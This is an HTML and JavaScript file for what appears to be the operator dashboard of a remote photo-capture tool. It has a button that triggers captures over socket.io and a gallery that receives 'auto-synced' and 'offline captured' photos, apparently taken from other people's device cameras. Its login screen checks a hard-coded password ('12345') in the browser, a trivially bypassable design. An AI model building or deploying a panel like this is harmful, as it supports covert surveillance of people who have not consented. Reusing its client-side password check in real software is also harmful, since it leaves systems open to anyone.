<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Password Protected</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #181818;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            background: #282828;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            width: 90%;
            max-width: 600px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        #loginOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #121212;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #444;
            margin-bottom: 12px;
            width: 200px;
            text-align: center;
        }
        button {
            background-color: #00e676;
            color: #000;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 15px;
            margin-top: 20px;
            max-height: 450px;
            overflow-y: auto;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 8px;
        }
        .card {
            background: #333;
            padding: 8px;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .card img {
            width: 100%;
            border-radius: 4px;
        }
        .download-btn {
            background-color: #0288d1;
            color: white;
            text-decoration: none;
            padding: 6px 12px;
            font-size: 12px;
            border-radius: 4px;
            margin-top: 8px;
            display: inline-block;
        }
    </style>
</head>
<body>

    <!-- Password Lock Screen -->
    <div id="loginOverlay">
        <h2>🔒 Admin Access Restricted</h2>
        <input type="password" id="passInput" placeholder="Enter Password">
        <button onclick="login()">LOGIN</button>
        <p id="errMsg" style="color: #ff5252; display: none; margin-top: 10px;">Incorrect Password!</p>
    </div>

    <!-- Protected Main Admin Dashboard -->
    <div class="container">
        <h2>👑 Admin Control & Stored Gallery</h2>

        <div style="margin-bottom: 20px;">
            <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">MANUAL CAPTURE NOW</button>
        </div>

        <h3>Captured Photos (Auto-Synced):</h3>
        <div class="gallery" id="photoGallery">
            <p id="emptyMsg" style="grid-column: 1/-1; color: #aaa;">No stored photos yet.</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();

        function login() {
            const pass = document.getElementById('passInput').value;
            // Admin Password Verification
            if (pass === '12345') {
                document.getElementById('loginOverlay').style.display = 'none';
                socket.emit('admin-auth-success');
            } else {
                document.getElementById('errMsg').style.display = 'block';
            }
        }

        function triggerManualCapture() {
            socket.emit('admin-trigger-capture');
        }

        function renderPhotoCard(imageData, fileName) {
            const emptyMsg = document.getElementById('emptyMsg');
            if (emptyMsg) emptyMsg.style.display = 'none';

            const gallery = document.getElementById('photoGallery');
            const card = document.createElement('div');
            card.className = 'card';

            const img = document.createElement('img');
            img.src = imageData;

            const btn = document.createElement('a');
            btn.className = 'download-btn';
            btn.href = imageData;
            btn.download = fileName || `photo_${Date.now()}.jpg`;
            btn.innerText = '💾 Download';

            card.appendChild(img);
            card.appendChild(btn);
            gallery.insertBefore(card, gallery.firstChild);
        }

        // Receive all past offline captured photos when admin logs in
        socket.on('load-stored-photos', (photosArray) => {
            photosArray.forEach(item => {
                renderPhotoCard(item.imageData, item.fileName);
            });
        });

        // Receive live photos
        socket.on('send-photo-to-admin', (data) => {
            renderPhotoCard(data.imageData, data.fileName);
        });
    </script>
</body>
</html>
